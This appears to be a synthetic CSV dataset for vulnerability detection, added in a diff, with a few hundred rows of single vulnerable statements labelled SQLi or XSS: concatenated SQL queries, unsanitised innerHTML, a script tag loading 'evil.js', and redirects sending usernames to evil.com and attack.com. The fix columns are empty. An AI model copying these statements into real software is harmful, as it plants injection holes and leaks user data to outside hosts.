@@ -1,0 +1,1001 @@
+cve_id,vulnerability_type,language,file,method,vulnerable_code,fixed_code,commit_hash,repo,commit_msg,granularity
+ROW-0,SQLi,python,line_8_0.py,snippet_0,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-1,XSS,javascript,line_19_1.js,snippet_1,alert('Hello ' + user_input);,,,,,statement
+ROW-2,XSS,javascript,line_2_2.js,snippet_2,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-3,SQLi,python,line_14_3.py,snippet_3,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-4,SQLi,python,line_17_4.py,snippet_4,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-5,XSS,javascript,line_10_5.js,snippet_5,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-6,XSS,javascript,line_10_6.js,snippet_6,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-7,XSS,javascript,line_16_7.js,snippet_7,alert('Hello ' + user_input);,,,,,statement
+ROW-8,SQLi,python,line_13_8.py,snippet_8,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-9,XSS,javascript,line_13_9.js,snippet_9,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-10,SQLi,python,line_10_10.py,snippet_10,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-11,XSS,javascript,line_12_11.js,snippet_11,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-12,SQLi,python,line_6_12.py,snippet_12,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-13,SQLi,python,line_19_13.py,snippet_13,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-14,SQLi,python,line_3_14.py,snippet_14,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-15,XSS,javascript,line_10_15.js,snippet_15,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-16,SQLi,python,line_5_16.py,snippet_16,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-17,SQLi,javascript,line_10_17.js,snippet_17,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-18,SQLi,python,line_1_18.py,snippet_18,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-19,XSS,javascript,line_20_19.js,snippet_19,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-20,XSS,javascript,line_8_20.js,snippet_20,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-21,XSS,javascript,line_20_21.js,snippet_21,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-22,SQLi,python,line_16_22.py,snippet_22,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-23,XSS,javascript,line_5_23.js,snippet_23,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-24,XSS,javascript,line_3_24.js,snippet_24,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-25,XSS,javascript,line_13_25.js,snippet_25,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-26,XSS,javascript,line_11_26.js,snippet_26,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-27,SQLi,javascript,line_7_27.js,snippet_27,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-28,XSS,javascript,line_15_28.js,snippet_28,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-29,SQLi,javascript,line_9_29.js,snippet_29,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-30,XSS,javascript,line_12_30.js,snippet_30,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-31,XSS,javascript,line_6_31.js,snippet_31,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-32,SQLi,python,line_12_32.py,snippet_32,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-33,XSS,javascript,line_3_33.js,snippet_33,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-34,XSS,javascript,line_9_34.js,snippet_34,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-35,SQLi,python,line_20_35.py,snippet_35,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-36,SQLi,python,line_10_36.py,snippet_36,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-37,SQLi,python,line_7_37.py,snippet_37,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-38,SQLi,python,line_2_38.py,snippet_38,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-39,SQLi,python,line_6_39.py,snippet_39,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-40,SQLi,python,line_5_40.py,snippet_40,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-41,XSS,javascript,line_3_41.js,snippet_41,alert('Hello ' + user_input);,,,,,statement
+ROW-42,XSS,javascript,line_16_42.js,snippet_42,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-43,SQLi,python,line_12_43.py,snippet_43,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-44,SQLi,python,line_11_44.py,snippet_44,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-45,XSS,javascript,line_17_45.js,snippet_45,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-46,SQLi,python,line_3_46.py,snippet_46,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-47,XSS,javascript,line_1_47.js,snippet_47,alert('Hello ' + user_input);,,,,,statement
+ROW-48,SQLi,python,line_9_48.py,snippet_48,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-49,SQLi,python,line_16_49.py,snippet_49,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-50,XSS,javascript,line_4_50.js,snippet_50,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-51,SQLi,python,line_2_51.py,snippet_51,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-52,SQLi,python,line_7_52.py,snippet_52,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-53,SQLi,javascript,line_20_53.js,snippet_53,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-54,XSS,javascript,line_14_54.js,snippet_54,alert('Hello ' + user_input);,,,,,statement
+ROW-55,XSS,javascript,line_3_55.js,snippet_55,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-56,XSS,javascript,line_19_56.js,snippet_56,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-57,SQLi,python,line_2_57.py,snippet_57,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-58,XSS,javascript,line_5_58.js,snippet_58,alert('Hello ' + user_input);,,,,,statement
+ROW-59,XSS,javascript,line_7_59.js,snippet_59,alert('Hello ' + user_input);,,,,,statement
+ROW-60,XSS,javascript,line_7_60.js,snippet_60,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-61,XSS,javascript,line_1_61.js,snippet_61,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-62,XSS,javascript,line_2_62.js,snippet_62,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-63,SQLi,python,line_6_63.py,snippet_63,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-64,SQLi,python,line_10_64.py,snippet_64,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-65,SQLi,javascript,line_11_65.js,snippet_65,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-66,XSS,javascript,line_8_66.js,snippet_66,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-67,SQLi,python,line_1_67.py,snippet_67,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-68,XSS,javascript,line_1_68.js,snippet_68,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-69,SQLi,python,line_4_69.py,snippet_69,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-70,XSS,javascript,line_18_70.js,snippet_70,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-71,XSS,javascript,line_2_71.js,snippet_71,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-72,XSS,javascript,line_7_72.js,snippet_72,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-73,XSS,javascript,line_9_73.js,snippet_73,alert('Hello ' + user_input);,,,,,statement
+ROW-74,SQLi,python,line_12_74.py,snippet_74,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-75,XSS,javascript,line_5_75.js,snippet_75,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-76,XSS,javascript,line_2_76.js,snippet_76,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-77,SQLi,javascript,line_9_77.js,snippet_77,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-78,XSS,javascript,line_6_78.js,snippet_78,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-79,SQLi,python,line_19_79.py,snippet_79,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-80,XSS,javascript,line_11_80.js,snippet_80,alert('Hello ' + user_input);,,,,,statement
+ROW-81,SQLi,python,line_15_81.py,snippet_81,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-82,SQLi,python,line_10_82.py,snippet_82,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-83,SQLi,javascript,line_15_83.js,snippet_83,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-84,SQLi,python,line_7_84.py,snippet_84,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-85,SQLi,python,line_13_85.py,snippet_85,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-86,XSS,javascript,line_20_86.js,snippet_86,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-87,XSS,javascript,line_6_87.js,snippet_87,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-88,SQLi,javascript,line_3_88.js,snippet_88,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-89,SQLi,python,line_11_89.py,snippet_89,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-90,XSS,javascript,line_15_90.js,snippet_90,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-91,XSS,javascript,line_11_91.js,snippet_91,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-92,SQLi,python,line_13_92.py,snippet_92,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-93,XSS,javascript,line_9_93.js,snippet_93,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-94,XSS,javascript,line_12_94.js,snippet_94,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-95,XSS,javascript,line_14_95.js,snippet_95,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-96,XSS,javascript,line_14_96.js,snippet_96,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-97,SQLi,python,line_13_97.py,snippet_97,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-98,SQLi,python,line_2_98.py,snippet_98,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-99,SQLi,javascript,line_16_99.js,snippet_99,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-100,SQLi,python,line_18_100.py,snippet_100,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-101,SQLi,python,line_15_101.py,snippet_101,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-102,XSS,javascript,line_7_102.js,snippet_102,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-103,SQLi,python,line_17_103.py,snippet_103,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-104,XSS,javascript,line_9_104.js,snippet_104,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-105,SQLi,python,line_20_105.py,snippet_105,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-106,SQLi,python,line_8_106.py,snippet_106,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-107,XSS,javascript,line_12_107.js,snippet_107,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-108,SQLi,python,line_11_108.py,snippet_108,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-109,SQLi,python,line_8_109.py,snippet_109,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-110,XSS,javascript,line_15_110.js,snippet_110,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-111,XSS,javascript,line_3_111.js,snippet_111,alert('Hello ' + user_input);,,,,,statement
+ROW-112,SQLi,javascript,line_9_112.js,snippet_112,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-113,XSS,javascript,line_10_113.js,snippet_113,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-114,SQLi,python,line_10_114.py,snippet_114,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-115,XSS,javascript,line_7_115.js,snippet_115,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-116,XSS,javascript,line_7_116.js,snippet_116,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-117,SQLi,python,line_14_117.py,snippet_117,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-118,XSS,javascript,line_14_118.js,snippet_118,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-119,XSS,javascript,line_8_119.js,snippet_119,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-120,XSS,javascript,line_4_120.js,snippet_120,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-121,XSS,javascript,line_12_121.js,snippet_121,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-122,SQLi,python,line_17_122.py,snippet_122,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-123,XSS,javascript,line_7_123.js,snippet_123,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-124,SQLi,python,line_14_124.py,snippet_124,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-125,XSS,javascript,line_7_125.js,snippet_125,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-126,SQLi,javascript,line_6_126.js,snippet_126,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-127,SQLi,python,line_6_127.py,snippet_127,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-128,XSS,javascript,line_18_128.js,snippet_128,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-129,XSS,javascript,line_2_129.js,snippet_129,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-130,SQLi,python,line_16_130.py,snippet_130,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-131,XSS,javascript,line_16_131.js,snippet_131,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-132,XSS,javascript,line_14_132.js,snippet_132,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-133,SQLi,python,line_8_133.py,snippet_133,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-134,XSS,javascript,line_11_134.js,snippet_134,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-135,SQLi,python,line_1_135.py,snippet_135,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-136,SQLi,python,line_1_136.py,snippet_136,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-137,XSS,javascript,line_6_137.js,snippet_137,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-138,XSS,javascript,line_19_138.js,snippet_138,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-139,XSS,javascript,line_15_139.js,snippet_139,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-140,SQLi,python,line_8_140.py,snippet_140,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-141,SQLi,python,line_12_141.py,snippet_141,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-142,SQLi,python,line_5_142.py,snippet_142,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-143,SQLi,python,line_11_143.py,snippet_143,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-144,SQLi,javascript,line_7_144.js,snippet_144,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-145,SQLi,python,line_19_145.py,snippet_145,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-146,SQLi,python,line_12_146.py,snippet_146,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-147,SQLi,python,line_3_147.py,snippet_147,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-148,XSS,javascript,line_15_148.js,snippet_148,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-149,SQLi,python,line_8_149.py,snippet_149,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-150,XSS,javascript,line_8_150.js,snippet_150,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-151,SQLi,javascript,line_17_151.js,snippet_151,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-152,SQLi,javascript,line_8_152.js,snippet_152,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-153,SQLi,python,line_10_153.py,snippet_153,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-154,XSS,javascript,line_15_154.js,snippet_154,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-155,XSS,javascript,line_2_155.js,snippet_155,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-156,SQLi,javascript,line_5_156.js,snippet_156,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-157,SQLi,python,line_2_157.py,snippet_157,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-158,SQLi,javascript,line_19_158.js,snippet_158,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-159,SQLi,python,line_3_159.py,snippet_159,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-160,SQLi,javascript,line_12_160.js,snippet_160,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-161,XSS,javascript,line_6_161.js,snippet_161,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-162,XSS,javascript,line_17_162.js,snippet_162,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-163,XSS,javascript,line_17_163.js,snippet_163,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-164,XSS,javascript,line_4_164.js,snippet_164,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-165,SQLi,python,line_2_165.py,snippet_165,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-166,SQLi,python,line_14_166.py,snippet_166,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-167,SQLi,python,line_15_167.py,snippet_167,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-168,XSS,javascript,line_7_168.js,snippet_168,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-169,XSS,javascript,line_10_169.js,snippet_169,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-170,SQLi,python,line_14_170.py,snippet_170,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-171,XSS,javascript,line_16_171.js,snippet_171,alert('Hello ' + user_input);,,,,,statement
+ROW-172,XSS,javascript,line_14_172.js,snippet_172,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-173,XSS,javascript,line_8_173.js,snippet_173,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-174,SQLi,python,line_3_174.py,snippet_174,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-175,SQLi,python,line_8_175.py,snippet_175,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-176,SQLi,python,line_12_176.py,snippet_176,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-177,SQLi,python,line_13_177.py,snippet_177,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-178,XSS,javascript,line_8_178.js,snippet_178,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-179,XSS,javascript,line_13_179.js,snippet_179,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-180,XSS,javascript,line_11_180.js,snippet_180,alert('Hello ' + user_input);,,,,,statement
+ROW-181,SQLi,python,line_13_181.py,snippet_181,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-182,SQLi,javascript,line_11_182.js,snippet_182,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-183,XSS,javascript,line_11_183.js,snippet_183,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-184,SQLi,python,line_17_184.py,snippet_184,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-185,SQLi,python,line_14_185.py,snippet_185,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-186,XSS,javascript,line_16_186.js,snippet_186,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-187,XSS,javascript,line_20_187.js,snippet_187,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-188,XSS,javascript,line_16_188.js,snippet_188,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-189,SQLi,python,line_20_189.py,snippet_189,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-190,XSS,javascript,line_18_190.js,snippet_190,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-191,SQLi,python,line_12_191.py,snippet_191,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-192,XSS,javascript,line_1_192.js,snippet_192,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-193,XSS,javascript,line_16_193.js,snippet_193,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-194,SQLi,python,line_2_194.py,snippet_194,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-195,XSS,javascript,line_19_195.js,snippet_195,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-196,XSS,javascript,line_2_196.js,snippet_196,alert('Hello ' + user_input);,,,,,statement
+ROW-197,SQLi,python,line_13_197.py,snippet_197,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-198,XSS,javascript,line_18_198.js,snippet_198,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-199,XSS,javascript,line_3_199.js,snippet_199,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-200,XSS,javascript,line_12_200.js,snippet_200,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-201,XSS,javascript,line_17_201.js,snippet_201,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-202,SQLi,python,line_11_202.py,snippet_202,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-203,SQLi,javascript,line_20_203.js,snippet_203,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-204,SQLi,python,line_2_204.py,snippet_204,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-205,XSS,javascript,line_13_205.js,snippet_205,alert('Hello ' + user_input);,,,,,statement
+ROW-206,XSS,javascript,line_2_206.js,snippet_206,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-207,SQLi,python,line_15_207.py,snippet_207,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-208,XSS,javascript,line_13_208.js,snippet_208,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-209,SQLi,javascript,line_18_209.js,snippet_209,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-210,XSS,javascript,line_3_210.js,snippet_210,alert('Hello ' + user_input);,,,,,statement
+ROW-211,XSS,javascript,line_2_211.js,snippet_211,alert('Hello ' + user_input);,,,,,statement
+ROW-212,XSS,javascript,line_12_212.js,snippet_212,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-213,XSS,javascript,line_3_213.js,snippet_213,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-214,XSS,javascript,line_14_214.js,snippet_214,alert('Hello ' + user_input);,,,,,statement
+ROW-215,SQLi,python,line_20_215.py,snippet_215,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-216,SQLi,javascript,line_4_216.js,snippet_216,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-217,SQLi,python,line_13_217.py,snippet_217,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-218,XSS,javascript,line_6_218.js,snippet_218,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-219,SQLi,python,line_17_219.py,snippet_219,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-220,XSS,javascript,line_3_220.js,snippet_220,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-221,SQLi,python,line_9_221.py,snippet_221,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-222,SQLi,python,line_15_222.py,snippet_222,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-223,XSS,javascript,line_1_223.js,snippet_223,alert('Hello ' + user_input);,,,,,statement
+ROW-224,XSS,javascript,line_5_224.js,snippet_224,alert('Hello ' + user_input);,,,,,statement
+ROW-225,SQLi,python,line_12_225.py,snippet_225,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-226,XSS,javascript,line_14_226.js,snippet_226,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-227,SQLi,python,line_2_227.py,snippet_227,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-228,XSS,javascript,line_20_228.js,snippet_228,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-229,XSS,javascript,line_7_229.js,snippet_229,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-230,SQLi,python,line_4_230.py,snippet_230,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-231,SQLi,javascript,line_5_231.js,snippet_231,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-232,XSS,javascript,line_11_232.js,snippet_232,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-233,XSS,javascript,line_1_233.js,snippet_233,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-234,XSS,javascript,line_20_234.js,snippet_234,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-235,XSS,javascript,line_19_235.js,snippet_235,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-236,XSS,javascript,line_7_236.js,snippet_236,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-237,SQLi,python,line_2_237.py,snippet_237,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-238,SQLi,python,line_12_238.py,snippet_238,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-239,SQLi,python,line_20_239.py,snippet_239,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-240,SQLi,python,line_7_240.py,snippet_240,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-241,XSS,javascript,line_3_241.js,snippet_241,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-242,SQLi,python,line_19_242.py,snippet_242,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-243,SQLi,javascript,line_19_243.js,snippet_243,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-244,SQLi,python,line_16_244.py,snippet_244,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-245,XSS,javascript,line_3_245.js,snippet_245,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-246,SQLi,python,line_12_246.py,snippet_246,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-247,SQLi,python,line_13_247.py,snippet_247,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-248,XSS,javascript,line_15_248.js,snippet_248,document.getElementById('input').innerHTML = user_input;,,,,,statement
